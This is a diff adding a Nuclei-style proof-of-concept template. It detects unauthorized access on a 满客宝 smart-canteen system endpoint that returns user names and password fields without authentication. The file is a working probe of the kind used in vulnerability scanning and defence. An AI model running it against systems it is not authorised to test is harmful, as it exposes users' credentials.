@@ -1,0 +1,33 @@
+id: poc-yaml-mankebao-selectuserbyorgid-unauthorized-access
+
+info:
+  name: 满客宝智慧食堂系统 selectUserByOrgId 未授权访问漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: unauthorized-access
+  description: |
+    满客宝智慧食堂系统 selectUserByOrgId endpoint is vulnerable to unauthorized access, potentially exposing sensitive user information.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yuding/selectUserByOrgId.action?record="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '"success":true'
+          - '"userName":'
+        part: body
+      - type: regex
+        regex:
+          - '"password":\".*?\"'
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
